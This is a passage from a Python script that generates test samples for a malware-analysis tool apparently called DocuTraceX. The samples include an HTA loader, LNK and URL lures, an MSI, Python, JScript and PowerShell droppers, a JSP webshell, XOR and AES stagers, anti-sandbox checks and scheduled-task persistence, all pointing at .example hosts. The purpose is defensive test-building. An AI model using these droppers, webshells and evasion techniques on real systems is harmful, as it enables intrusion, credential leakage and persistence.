        '<html><head><hta:application id="x" windowstate="minimize"/>\n'
        '<script language="VBScript">\n'
        'Set sh = CreateObject("WScript.Shell")\n'
        f'sh.Run "powershell -nop -w hidden -enc {PS_B64}", 0, False\n'
        "</script>\n"
        '<script language="JScript">\n'
        f"var x = new ActiveXObject('MSXML2.XMLHTTP'); x.open('GET','{PAYLOAD_URL}',false); x.send();\n"
        "new ActiveXObject('WScript.Shell').Run('cmd /c start report.docm',0,false);\n"
        "</script></head><body>Cargando factura...</body></html>\n"
    )
    return body.encode()


def shortcut_lnk() -> bytes:
    """A .lnk disguised as a PDF (double extension) whose target is cmd.exe
    launching a hidden, Base64-encoded PowerShell stage — the classic LNK lure.
    Exercises LnkParse3 parsing, the LOLBin/hidden-window/double-extension rules
    and the command → scripting-engine path. All indicators inert."""
    import tempfile

    import pylnk3

    with tempfile.NamedTemporaryFile(suffix=".lnk", delete=False) as tmp:
        name = tmp.name
    try:
        pylnk3.for_file(
            r"C:\Windows\System32\cmd.exe",
            lnk_name=name,
            arguments=f"/c powershell -nop -w hidden -enc {PS_B64}",
            description=f"Factura {INVOICE}",
            work_dir=r"C:\Users\Public",
            icon_file=r"C:\Program Files\Adobe\Acrobat\Acrobat.exe", icon_index=0)
        return Path(name).read_bytes()
    finally:
        Path(name).unlink(missing_ok=True)


def internet_shortcut_url() -> bytes:
    """A .url (Internet Shortcut) pointing at a remote script payload, with its
    IconFile on a UNC path (SMB/NTLM hash leak, CVE-2024-21412 style). Inert INI
    text; exercises the .url parser and its remote-file / UNC-icon / exec rules."""
    body = (
        "[InternetShortcut]\r\n"
        f"URL=file://{C2_IP}/share/factura_{INVOICE}.exe\r\n"
        f"IconFile=\\\\{C2_IP}\\share\\icon.ico\r\n"
        "IconIndex=0\r\n"
        "[InternetShortcut.A]\r\n"
        "IDList=\r\n"
    )
    return body.encode()


def installer_msi() -> bytes:
    """A minimal .msi (OLE/CFB) with a CustomAction + InstallExecuteSequence +
    Binary table and a _StringData pool carrying a PowerShell downloader and an
    embedded Binary stream (inert MZ stub). Exercises the MSI stream-name decode,
    the dangerous-table rules, the string mining → scripting engine and the
    embedded-binary rule. Built with the shared CFB writer (no Windows needed)."""
    sys.path.insert(0, str(ROOT / "scripts"))
    from cfb import build_cfb

    sys.path.insert(0, str(ROOT))
    from docutracex.parsers.msi import encode_streamname as enc

    strdata = (
        b"CustomActionData\x00"
        + f"powershell -NoProfile -w hidden -Command IEX(New-Object Net.WebClient)."
          f"DownloadString('{STAGE2_URL}')".encode()
        + b"\x00RunStage\x00Binary\x00"
        + f"{STAGE2_URL}\x00".encode()
    )
    # As Windows Installer writes them: the system streams (_StringData,
    # _StringPool, _Tables, _Columns) carry the 0x4840 table prefix like any
    # table; only named data streams (Binary.*) don't.
    tree = {
        enc("_StringData", True): strdata,
        enc("_StringPool", True): b"\x00" * 8,
        enc("_Tables", True): b"\x00" * 8,
        enc("_Columns", True): b"\x00" * 8,
        enc("CustomAction", True): b"\x00" * 8,
        enc("InstallExecuteSequence", True): b"\x00" * 8,
        enc("Binary", True): b"\x00" * 8,
        enc("Binary.stage", False): MZ_STUB,
    }
    return build_cfb(tree)


_PY_DROPPER_SRC = (
    "# Factura 2026-0187 - visor seguro (no editar)\n"
    "import base64, os, subprocess, urllib.request\n"
    f"STAGE = \"{STAGE2_URL}\"\n"
    "def run():\n"
    "    data = urllib.request.urlopen(STAGE).read()\n"
    "    p = os.path.join(os.environ.get('TEMP', '/tmp'), 'upd.bin')\n"
    "    open(p, 'wb').write(data)\n"
    f"    subprocess.Popen('powershell -nop -w hidden -enc {PS_B64}', shell=True)\n"
    "    exec(base64.b64decode('cHJpbnQoJ2ZhY3R1cmEgMjAyNi0wMTg3Jyk='))\n"
    "run()\n"
)


def dropper_py() -> bytes:
    """A .py dropper: urllib download + subprocess PowerShell (Base64) + an
    exec(base64.b64decode(...)) wrapper the light decoder peels. Python tab."""
    return _PY_DROPPER_SRC.encode()


def dropper_pyc() -> bytes:
    """The same dropper byte-compiled (.pyc). With pycdc it decompiles to source;
    otherwise the engine reconstructs the dotted calls from the bytecode. Built
    with the running interpreter at sample time; indicators are inert."""
    import importlib.util
    code = compile(_PY_DROPPER_SRC, "visor.py", "exec")
    import marshal as _m
    return importlib.util.MAGIC_NUMBER + b"\x00" * 12 + _m.dumps(code)


def pyinstaller_exe() -> bytes:
    """A minimal PyInstaller-frozen .exe: a PE stub with a CArchive holding the
    dropper as an entry script. Exercises the CArchive/PYZ unpacker → Python
    engine. Not a real program; the appended data is inert."""
    import marshal as _m
    import sys as _sys

    code = compile(_PY_DROPPER_SRC, "visor.py", "exec")
    data = _m.dumps(code)
    name = b"visor"
    toc = struct.pack(">IIIIB", 18 + len(name), 0, len(data), len(data), 0) + b"s" + name
    pyvers = _sys.version_info.major * 100 + _sys.version_info.minor
    pylib = f"python{_sys.version_info.major}{_sys.version_info.minor}.dll".encode().ljust(64, b"\x00")
    magic = b"MEI\014\013\012\013\016"
    pkg = data + toc + magic + struct.pack(">IIII", len(data) + len(toc) + 88, len(data), len(toc), pyvers) + pylib
    pe_stub = b"MZ\x90\x00" + b"\x00" * 120 + b"PE\x00\x00" + b"\x00" * 64
    return pe_stub + pkg


def java_class_stub() -> bytes:
    """A minimal but valid .class whose constant pool references the suspicious
    APIs (Runtime.exec, URL.openStream, ScriptEngineManager, defineClass,
    javax.crypto) and a stage URL — enough to fire the Java rules without needing
    javac at sample time. Inert: it has no methods/bytecode."""
    pool: list[bytes] = []

    def add(entry: bytes) -> int:
        pool.append(entry)
        return len(pool)                       # 1-based constant-pool index

    def utf8(s: str) -> int:
        b = s.encode()
        return add(bytes([1]) + struct.pack(">H", len(b)) + b)

    def klass(name: str) -> int:
        return add(bytes([7]) + struct.pack(">H", utf8(name)))

    def nat(name: str, desc: str) -> int:
        return add(bytes([12]) + struct.pack(">HH", utf8(name), utf8(desc)))

    def methodref(cls: str, meth: str, desc: str) -> None:
        ci, ni = klass(cls), nat(meth, desc)
        add(bytes([10]) + struct.pack(">HH", ci, ni))

    methodref("java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
    methodref("java/net/URL", "openStream", "()Ljava/io/InputStream;")
    methodref("javax/script/ScriptEngineManager", "getEngineByName",
              "(Ljava/lang/String;)Ljavax/script/ScriptEngine;")
    for s in (STAGE2_URL, "defineClass", "javax/crypto/Cipher", "java/util/Base64"):
        utf8(s)
    this_ci = klass("Shell")
    obj_ci = klass("java/lang/Object")
    body = b"".join(pool)
    header = b"\xca\xfe\xba\xbe" + struct.pack(">HH", 0, 52) + struct.pack(">H", len(pool) + 1) + body
    tail = struct.pack(">HHHHHHH", 0x21, this_ci, obj_ci, 0, 0, 0, 0)
    return header + tail


def malicious_jar() -> bytes:
    """An executable .jar: MANIFEST with Main-Class + a Premain-Class (Java agent)
    and the suspicious Shell.class. Exercises manifest parsing + .class rules."""
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("META-INF/MANIFEST.MF",
                    "Manifest-Version: 1.0\r\nCreated-By: 1.8.0_381\r\n"
                    "Main-Class: Shell\r\nPremain-Class: Shell\r\n\r\n")
        zf.writestr("Shell.class", java_class_stub())
    return buf.getvalue()


def webshell_war() -> bytes:
    """A .war with a JSP webshell (request param -> Runtime.exec), a web.xml
    servlet mapping and a bundled Shell.class. Exercises the JSP rules,
    web.xml parsing and the nested path."""
    import io
    import zipfile

    jsp = ('<%@ page import="java.util.*,java.io.*" %>\n'
           '<% String c = request.getParameter("cmd");\n'
           '   if (c != null) { Process p = Runtime.getRuntime().exec(c);\n'
           '   BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); } %>\n')
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("WEB-INF/web.xml",
                    '<?xml version="1.0"?>\n<web-app>\n <servlet>\n'
                    '  <servlet-name>s</servlet-name>\n  <servlet-class>com.example.Shell</servlet-class>\n'
                    ' </servlet>\n <servlet-mapping>\n  <servlet-name>s</servlet-name>\n'
                    '  <url-pattern>/admin/*</url-pattern>\n </servlet-mapping>\n</web-app>\n')
        zf.writestr("cmd.jsp", jsp)
        zf.writestr("WEB-INF/classes/Shell.class", java_class_stub())
    return buf.getvalue()


def _build_cab(files: dict[str, bytes]) -> bytes:
    """A minimal uncompressed (stored) Microsoft Cabinet with one folder."""
    stream = b""
    cffiles = b""
    for name, data in files.items():
        cffiles += struct.pack("<IIHHHH", len(data), len(stream), 0, 0, 0, 0) + name.encode() + b"\x00"
        stream += data
    cfdata = struct.pack("<IHH", 0, len(stream), len(stream)) + stream     # stored, single block
    coff_files = 36 + 8
    coff_data = coff_files + len(cffiles)
    cffolder = struct.pack("<IHH", coff_data, 1, 0)                        # coffCabStart, cCFData, typeComp=0
    total = coff_data + len(cfdata)
    header = b"MSCF" + struct.pack("<IIII", 0, total, 0, coff_files) + \
        struct.pack("<IBBHHHHH", 0, 3, 1, 1, len(files), 0, 0, 0)
    return header + cffolder + cffiles + cfdata


def cabinet_cab() -> bytes:
    """A .cab carrying the batch dropper and the PowerShell stage-2."""
    return _build_cab({"instalador.bat": dropper_bat(), "actualizador.ps1": stage2_ps1()})


def optical_image_iso() -> bytes:
    """An .iso (Joliet) carrying the shortcut lure and the batch dropper — the
    Mark-of-the-Web bypass pattern (double-click the LNK on a mounted image)."""
    import io

    import pycdlib

    iso = pycdlib.PyCdlib()
    iso.new(joliet=3, vol_ident="FACTURA")
    for iso_name, joliet_name, data in (
        ("FACTURA.LNK;1", "/factura.pdf.lnk", shortcut_lnk()),
        ("INSTALAR.BAT;1", "/instalar.bat", dropper_bat()),
    ):
        iso.add_fp(io.BytesIO(data), len(data), "/" + iso_name, joliet_path=joliet_name)
    out = io.BytesIO()
    iso.write_fp(out)
    iso.close()
    return out.getvalue()


def tarball_tgz() -> bytes:
    """A .tar.gz bundling the obfuscated scripts (gzip-compressed tarball)."""
    import io
    import tarfile

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in (("actualizador.ps1", stage2_ps1()), ("factura.pdf.vbs", dropper_vbs())):
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def prefixed_zip_noext() -> bytes:
    """An archive the app can't recognise by its signature, saved with no
    extension: a ZIP preceded by 4 KB of junk (as a dropper's payload carved from
    another file, or an SFX stub). ``unlock.detect`` looks for ``PK`` at offset 0
    and misses it; 7-Zip finds the ZIP further in — the 7-Zip probe path."""
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("factura/instalar.bat", dropper_bat())
        zf.writestr("factura/actualizador.ps1", stage2_ps1())
    junk = (b"FACTURA-2026-0187\x00" + bytes(range(256))) * 15
    return junk[:4096] + buf.getvalue()


def onenote_one() -> bytes:
    """A minimal OneNote (.one) section with two embedded FileDataStoreObject
    lures (an HTA and a VBS) carved by the onenote parser. Ininert payloads."""
    one_magic = bytes((0xE4, 0x52, 0x5C, 0x7B, 0x8C, 0xD8, 0xA7, 0x4D,
                       0xAE, 0xB1, 0x53, 0x78, 0xD0, 0x29, 0x96, 0xD3))
    guid_h = bytes((0xE7, 0x16, 0xE3, 0xBD, 0x65, 0x26, 0x11, 0x45,
                    0xA4, 0xC4, 0x8D, 0x4D, 0x0B, 0x7A, 0x9E, 0xAC))
    guid_f = bytes((0x22, 0xA7, 0xFB, 0x71, 0x79, 0x0F, 0x0B, 0x4A,
                    0xBB, 0x13, 0x89, 0x92, 0x56, 0x42, 0x6B, 0x24))

    def fds(data: bytes) -> bytes:
        obj = guid_h + struct.pack("<Q", len(data)) + b"\x00" * 4 + b"\x00" * 8 + data
        obj += b"\x00" * ((8 - len(obj) % 8) % 8)               # align to 8 bytes
        return obj + guid_f

    header = one_magic + b"\x00" * 1024                          # inert ONESTORE-ish prologue
    return header + fds(loader_hta()) + fds(dropper_vbs())


def packed_pe_exe() -> bytes:
    """A minimal but valid PE32+ that looks packed: two UPX-named sections
    (one high-entropy, writable+executable) and no import table. Exercises the
    pefile analysis — packer-section, high-entropy, W+X and entry-point rules.
    Inert: it carries no code and never runs."""
    import random

    FA, SA = 0x200, 0x1000

    def al(n: int, a: int) -> int:
        return (n + a - 1) & ~(a - 1)

    random.seed(20260187)
    secdata = [("UPX0", b"\x00" * 0x200),
               ("UPX1", bytes(random.randrange(256) for _ in range(0x400)))]
    nsec = len(secdata)
    e_lfanew = 0x80
    opt_size = 240
    size_headers = al(e_lfanew + 4 + 20 + opt_size + nsec * 40, FA)
    secs = []
    rawptr, va = size_headers, SA
    for name, data in secdata:
        raw = al(len(data), FA)
        secs.append((name, va, len(data), rawptr, raw, data))
        rawptr += raw
        va = al(va + max(len(data), SA), SA)
    size_image = al(va, SA)
    ep = secs[0][1]
    dos = b"MZ" + b"\x00" * 0x3a + struct.pack("<I", e_lfanew) + b"\x00" * (e_lfanew - 0x40)
    coff = struct.pack("<HHIIIHH", 0x8664, nsec, 0, 0, 0, opt_size, 0x2022)
    opt = struct.pack("<HBBIIIII", 0x20b, 14, 0, 0x200, 0x400, 0, ep, 0)
    opt += struct.pack("<Q", 0x140000000)
    opt += struct.pack("<IIHHHHHHIIIIHH", SA, FA, 6, 0, 0, 0, 6, 0, 0, size_image, size_headers, 0, 2, 0)
    opt += struct.pack("<QQQQ", 0x100000, 0x1000, 0x100000, 0x1000)
    opt += struct.pack("<II", 0, 16) + b"\x00" * (16 * 8)
    opt = opt[:opt_size].ljust(opt_size, b"\x00")
    sectbl = b""
    for name, va, vsize, rawptr, raw, data in secs:
        sectbl += name.encode().ljust(8, b"\x00") + struct.pack("<IIII", vsize, va, raw, rawptr)
        sectbl += struct.pack("<IIHHI", 0, 0, 0, 0, 0xE0000020)
    body = (dos + b"PE\x00\x00" + coff + opt + sectbl).ljust(size_headers, b"\x00")
    for name, va, vsize, rawptr, raw, data in secs:
        body = body.ljust(rawptr, b"\x00") + data.ljust(raw, b"\x00")
    return body


def dropper_bundle_zip() -> bytes:
    """A plain .zip bundling the obfuscated scripts, shortcuts, Python, Java and a
    OneNote lure, to exercise the nested (recursive) path on every engine."""
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("factura_visor.js", obf_js())
        zf.writestr("visor_seguro.js", obf_obfuscatorio_js())
        zf.writestr("actualizador.ps1", stage2_ps1())
        zf.writestr("factura.pdf.vbs", dropper_vbs())
        zf.writestr("instalador.bat", dropper_bat())
        zf.writestr("factura.hta", loader_hta())
        zf.writestr("factura.pdf.lnk", shortcut_lnk())
        zf.writestr("factura.url", internet_shortcut_url())
        zf.writestr("instalador.msi", installer_msi())
        zf.writestr("visor.py", dropper_py())
        zf.writestr("visor.pyc", dropper_pyc())
        zf.writestr("plugin.jar", malicious_jar())
        zf.writestr("notas.one", onenote_one())
    return buf.getvalue()


# --- main -----------------------------------------------------------------------------

def ioc_noise_bat() -> bytes:
    """Batch dropper whose comments carry IOC *noise* the extractor must drop:
    tool self-URLs, binary-garbage "paths", escaped byte runs and the app's own
    install path. The real indicators (inert) must still be reported."""
    lines = [
        "@echo off",
        "rem invoice-2024-0613 payment helper",
        "rem real: download stage2 from http://billing-portal.example/inv/stage2.ps1",
        r"rem real: copy to C:\Users\Public\Documents\invoice_view.exe",
        r"rem real: persist via %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\inv.lnk",
        "rem noise: see https://github.com/decalage2/oletools/wiki and http://decalage.info/python/oletools",
        "rem noise: colors by https://github.com/borntyping/python-colorlog",
        r"rem noise: C:\a\x4d\x5a\x90\x00",
        "rem noise: C:\\\xc3\xa2\xc3\xa3\xc3\xa4\xc3\xa5\\data",
        r"rem noise: C:\Tools\DocuTraceX\tools\python\python.exe",
        "rem noise (no such TLD at IANA): cfg.zz row.qq data.xx",
        "rem real: reply to accounts@billing-portal.example",
        "rem noise: invoices are paid at month end, type of payment: transfer",
        # signed-MSI / bundled-runtime noise (CPython license, PKI, printf, build agent, JS members)
        "rem noise: http://crl3.digicert.com/x.crl cacerts.digicert.com https://sectigo.com/CPS www.pythonlabs.com",
        "rem noise: builtins.id collections.abc self.af thread.local 1.invalid action.name microsoft.windows os.py",
        "rem noise: [RuntimeVsdnetRTName].NET jseward@acm.org policy 2.23.140.1.3.6.1",
        r"rem noise: D:\a\1\s\Objects\object.c D:\a\1\b\bin\amd64\python311.pdb",
        "rem noise: cmd = 'LIST'",
        "rem noise: nc += prev",
        r'copy "C:\Program Files\Billing Portal\inv viewer.exe" %TEMP%\inv.exe',
        "powershell -nop -w hidden -c \"iwr http://billing-portal.example/inv/stage2.ps1\"",
        "",
    ]
    return "\r\n".join(lines).encode("utf-8")


def obf_techniques_js() -> bytes:
    """JScript dropper that stacks the obfuscation techniques DocuTraceX names
    (javascript_mejoras.md): fake jQuery header, arithmetic literals, a massive
    \\xNN block, a custom XOR decryptor with a hard-coded key over a numeric
    payload array, fromCharCode with arithmetic, an IIFE fed a long string, and
    anti-sandbox timing (WScript.Sleep + a Date delta). The decrypted payload is
    an inert PowerShell line pointing at *.example. Benign: never runs anything
    real outside a sandbox stub."""
    payload = ('powershell -nop -w hidden -c "Write-Host invoice-check; '
               'iwr http://billing-portal.example/inv/stage3.ps1 -OutFile $env:TEMP\\inv.ps1"')
    key = "Fact2024"
    arr = ",".join(str(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
    esc = "".join(f"\\x{ord(c):02x}" for c in "MSXML2.XMLHTTP|WScript.Shell|Scripting.FileSystemObject|ADODB.Stream")
    blob = "aW52b2ljZS0yMDI0LTA2MTMgcGF5bWVudCByZWNlaXB0IC0gYmlsbGluZy1wb3J0YWwuZXhhbXBsZQ==" * 2
    js = f"""/*!
 * jQuery JavaScript Library v3.7.1
 * https://jquery.com/
 * Copyright OpenJS Foundation and other contributors
 * Released under the MIT license
 */
var _0xa = "{esc}";
var cfg = [(40+20),(9*3),(100-1),(7*7),(50+50),(3*11),(64-16),(2*21),(90+9),(12*5)];
var k = "{key}";
var data = [{arr}];
function dec(a, key) {{
  var o = "";
  for (var i = 0; i < a.length; i++) {{ o += String.fromCharCode(a[i] ^ key.charCodeAt(i % key.length)); }}
  return o;
}}
var t0 = new Date().getTime();
WScript.Sleep((5*3)*1000);
var t1 = new Date().getTime();
if (t1 - t0 < (10*1000)) {{ /* time skipped: probably a sandbox */ }}
var shellName = String.fromCharCode((80+7), (80+3), (90+9), (100+14), (100+5), (100+12), (110+6)) + ".Shell";
(function(s) {{ var note = s.length; }})("{blob}");
var sh = new ActiveXObject(shellName);
sh.Run(dec(data, k), 0, false);
"""
    return js.encode("utf-8")


def _xor_deflate_stager(final: str, key: str = "inv") -> str:
    """PowerShell stager: base64 blob XOR-decrypted with a string key, whose
    plain text is a Deflate-compressed stage that runs ``final``."""
    import base64
    import zlib

    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    comp = base64.b64encode(c.compress(final.encode()) + c.flush()).decode()
    stage2 = ("$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('" + comp + "'))\n"
              "IEX (New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream($s, "
              "[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()")
    kb = key.encode()
    blob = base64.b64encode(bytes(b ^ kb[i % len(kb)] for i, b in enumerate(stage2.encode()))).decode()
    url = ",".join(str(ord(ch) ^ 0x2A) for ch in "http://billing-portal.example/inv/beacon")
    return (f"# invoice-2024-0613 payment sync\n$k = '{key}'\n"
            f"$b = [Convert]::FromBase64String('{blob}')\n"
            "for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor $k[$i % $k.Length] }\n"
            f"$u = -join (({url}) | %{{[char]($_ -bxor 0x2a)}})\n"
            "iex ([Text.Encoding]::ASCII.GetString($b))\n")


_CHAIN_FINAL = ("IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/inv/stage4.ps1'); "
                "Start-Process $env:TEMP\\inv_viewer.exe")


def xor_stager_ps1() -> bytes:
    """PowerShell stager: XOR (string key) -> Deflate -> final download+run,
    plus a URL hidden in a char array XOR-ed with 0x2a. Inert (*.example)."""
    return _xor_deflate_stager(_CHAIN_FINAL).encode("utf-8")


def chain_dropper_js() -> bytes:
    """Three-language chain, each stage a nested child of the previous one:
    JScript XOR-decrypts a VBScript and drops it (FileSystemObject) -> the
    VBScript runs ``powershell -enc <stager>`` -> the stager XOR-decrypts and
    inflates the final stage (download stage4.ps1 + start inv_viewer.exe)."""
    import base64

    enc = base64.b64encode(_xor_deflate_stager(_CHAIN_FINAL).encode("utf-16-le")).decode()
    payload = ('Dim sh\r\nSet sh = CreateObject("WScript.Shell")\r\n'
               f'sh.Run "powershell -nop -w hidden -enc {enc}", 0, False\r\n')
    key = "Fact2024"
    arr = ",".join(str(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
    js = f"""// invoice viewer helper
var k = "{key}";
var data = [{arr}];
function dec(a, key) {{
  var o = "";
  for (var i = 0; i < a.length; i++) {{ o += String.fromCharCode(a[i] ^ key.charCodeAt(i % key.length)); }}
  return o;
}}
var fso = new ActiveXObject("Scripting.FileSystemObject");
var p = fso.GetSpecialFolder(2) + "\\\\inv_sync.vbs";
fso.CreateTextFile(p, true).Write(dec(data, k));
new ActiveXObject("WScript.Shell").Run("wscript.exe //B " + p, 0, false);
"""
    return js.encode("utf-8")


def wsh_selfread_dropper_js() -> bytes:
    """JScript dropper with the WSH tricks real loaders use (inert):
    a Sleep + clock-delta anti-sandbox check, it reads ITSELF (ScriptFullName)
    to pull a payload hidden in a trailing comment, writes it as a .ps1 with
    FileSystemObject and launches it hidden through WMI Win32_Process.Create.
    The .ps1 hides its strings in XOR'ed number arrays held in variables and
    in a hex-decoder helper, and registers a logon scheduled task."""
    def xr(t: str, k: int) -> str:
        return ",".join(f"{ord(c) ^ k:03d}" for c in t)

    def hx(t: str) -> str:
        return t.encode().hex().upper()

    task_xml = ('<Exec><Command>wscript.exe</Command><Arguments>//B //NoLogo '
                '"%LOCALAPPDATA%\\InvoiceSync\\manifest.js"</Arguments></Exec>')
    dl = "IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/inv/stage5.ps1')"
    ps = "\r\n".join([
        "# invoice-2024-0613 sync agent",
        f"$r1=@({xr(dl, 70)})",
        "$rk1=070",
        "$rs1=-join($r1|ForEach-Object{[char]([int]$_-bxor$rk1)})",
        "$h2s = { param($h) $o=New-Object Text.StringBuilder; $i=0; while($i-lt$h.Length){ "
        "[void]$o.Append([char][Convert]::ToInt32($h.Substring($i,2),16)); $i+=2 } $o.ToString() }",
        f"$svc = & $h2s '{hx('Schedule.Service')}'",
        f"$cmd = & $h2s '{hx(task_xml)}'",
        "$ts = New-Object -ComObject $svc; $ts.Connect()",
        "$null = $ts.GetFolder('\\').RegisterTask('\\InvoiceSync42', $cmd, 6, $null, $null, 3, $null)",
        "& ([scriptblock]::Create($rs1))",
    ])
    marker = "//PAYLOAD:"
    js = f"""// invoice viewer helper
var t0 = new Date().getTime();
WScript.Sleep(4000);
if (new Date().getTime() - t0 < 3000) {{ WScript.Quit(); }}
var fso = WScript.CreateObject("Scripting.FileSystemObject");
var me = fso.OpenTextFile(WScript.ScriptFullName, 1).ReadAll();
var body = me.substring(me.lastIndexOf("{marker}") + {len(marker)}).split("\\n").join("\\r\\n");
var sh = WScript.CreateObject("WScript.Shell");
var dir = sh.ExpandEnvironmentStrings("%TEMP%") + "\\\\invsync";
fso.CreateFolder(dir);
var f = fso.CreateTextFile(dir + "\\\\w20240613.ps1", true);
f.Write(body); f.Close();
var wmi = GetObject("winmgmts:root\\\\cimv2");
wmi.Get("Win32_Process").Create("powershell -nop -w hidden -ep Bypass -f " + dir + "\\\\w20240613.ps1");
"""
    return (js + marker + ps.replace("\r\n", "\\n")).encode("utf-8")


def encoded_blobs_ps1() -> bytes:
    """PowerShell loader whose data hides in literals its own helper functions
    decode (so the static deobfuscator leaves them as they are): a base64 of a
    GZIP'ed config (with the C2 URL), an encrypted-looking base64 blob, and a
    hex-encoded PE (MZ + text stub, inert). Every one must come out as a
    nested child: config text (IOCs), opaque blob (entropy), PE."""
    import base64
    import gzip
    import random

    cfg = ("[sync]\r\nserver=http://billing-portal.example/inv/c2\r\ninterval=3600\r\n"
           "drop=%APPDATA%\\InvoiceSync\\upd.exe\r\n")
    cfg_b64 = base64.b64encode(gzip.compress(cfg.encode(), mtime=0)).decode()
    rnd = random.Random(20240613)
    blob_b64 = base64.b64encode(bytes(rnd.randrange(256) for _ in range(768))).decode()
    pe = (b"MZ" + b"\x90" * 58 + b"\x80\x00\x00\x00" + b"This program cannot be run in DOS mode. "
          b"Inert DocuTraceX sample stub (invoice-2024-0613), not a real executable." * 2)
    pe_hex = pe.hex()
    return "\r\n".join([
        "# invoice-2024-0613 sync agent (own codecs: the deobfuscator cannot fold them)",
        "function Get-Cfg($s) { $b = [Convert]::FromBase64String($s); $m = New-Object IO.MemoryStream(,$b)",
        "  (New-Object IO.StreamReader((New-Object IO.Compression.GZipStream($m, 0)))).ReadToEnd() }",
        "function Get-Bytes($h) { [byte[]]($h -split '(..)' | ? { $_ } | % { [Convert]::ToByte($_, 16) }) }",
        f"$cfg = Get-Cfg '{cfg_b64}'",
        f"$key = '{blob_b64}'",
        f"$img = Get-Bytes '{pe_hex}'",
        "[IO.File]::WriteAllBytes(\"$env:TEMP\\upd.exe\", $img)",
        "",
    ]).encode("utf-8")


def crypto_loader_ps1() -> bytes:
    """PowerShell loader whose stages are encrypted with key material written in
    the script itself (inert): a PE (MZ + text stub) XOR'ed with one byte, a
    GZIP'ed config under AES-256-CBC with [byte[]] key/IV arrays, and a payload
    in a SecureString exported with -Key (1..32). Static analysis recovers all
    three: the XOR'ed PE and the AES config as nested children (with their
    recipe), the SecureString decrypted in place."""
    import base64
    import gzip

    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    def aes(key: bytes, iv: bytes, data: bytes) -> bytes:
        pad = 16 - len(data) % 16
        return Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor().update(data + bytes([pad]) * pad)

    pe = (b"MZ" + b"\x90" * 58 + (0x80).to_bytes(4, "little") + b"\x00" * 64
          + b"This program cannot be run in DOS mode. Inert DocuTraceX stub (invoice-2024-0613). " * 4)
    xored = base64.b64encode(bytes(b ^ 0x5A for b in pe)).decode()
    key, iv = bytes(range(11, 43)), bytes(range(200, 216))
    cfg = gzip.compress(("[sync]\r\nserver=http://billing-portal.example/inv/aes-c2\r\n"
                         "interval=3600\r\nid=" + "a1b2c3d4" * 40 + "\r\n").encode(), mtime=0)
    cfg_ct = base64.b64encode(aes(key, iv, cfg)).decode()
    ss_plain = "IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/inv/ss-stage.ps1')"
    ss_iv = bytes(range(16))
    inner = f"2|{base64.b64encode(ss_iv).decode()}|{aes(bytes(range(1, 33)), ss_iv, ss_plain.encode('utf-16-le')).hex()}"
    ss_blob = "76492d1116743f0423413b16050a5345" + base64.b64encode(inner.encode("utf-16-le")).decode()
    return "\r\n".join([
        "# invoice-2024-0613 sync agent: stages encrypted with keys kept in the script",
        "function Open-Blob($b64, $k) { $d = [Convert]::FromBase64String($b64); for ($i = 0; $i -lt $d.Length; $i++) { $d[$i] = $d[$i] -bxor $k }; $d }",
        "function Open-Cfg($b64, $k, $v) { $a = [Security.Cryptography.Aes]::Create(); $a.Key = $k; $a.IV = $v",
        "  $a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($b64), 0, ([Convert]::FromBase64String($b64)).Length) }",
        f"[byte[]]$aesKey = @({','.join(map(str, key))})",
        f"[byte[]]$aesIV = @({','.join(map(str, iv))})",
        f"$img = Open-Blob '{xored}' 0x5A",
        f"$cfg = Open-Cfg '{cfg_ct}' $aesKey $aesIV",
        f"$enc = '{ss_blob}'",
        "$ss = ConvertTo-SecureString $enc -Key (1..32)",
        "$cmd = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss))",
        "iex $cmd",
        "",
    ]).encode("utf-8")


def msxml_dropper_js() -> bytes:
    """JScript dropper using THE classic binary-drop trick (inert): a PE (MZ +
    text stub) in base64 decoded through MSXML (createElement + dataType
    "bin.base64" + nodeTypedValue), written with a binary ADODB.Stream and run."""
    import base64

    pe = (b"MZ" + b"\x90" * 58 + (0x80).to_bytes(4, "little") + b"\x00" * 64
          + b"This program cannot be run in DOS mode. Inert DocuTraceX stub (invoice-2024-0613). " * 4)
    b64 = base64.b64encode(pe).decode()
    chunks = [b64[i:i + 76] for i in range(0, len(b64), 76)]
    lines = " +\n  ".join(f'"{c}"' for c in chunks)
    return f"""// invoice viewer update
var data =
  {lines};
var xml = new ActiveXObject("Msxml2.DOMDocument.6.0");
var el = xml.createElement("b64");
el.dataType = "bin.base64";
el.text = data;
var st = new ActiveXObject("ADODB.Stream");
st.Type = 1;
st.Open();
st.Write(el.nodeTypedValue);
var sh = new ActiveXObject("WScript.Shell");
var path = sh.ExpandEnvironmentStrings("%TEMP%") + "\\\\invoice_viewer.exe";
st.SaveToFile(path, 2);
st.Close();
sh.Run(path, 0, false);
""".encode("utf-8")


def invoke_obfuscation_ps1() -> bytes:
    """PowerShell launcher wrapped in four Invoke-Obfuscation-style layers (inert):
    alias + [regex] RightToLeft reversal → wildcard command lookup (gcm *ke-e*) +
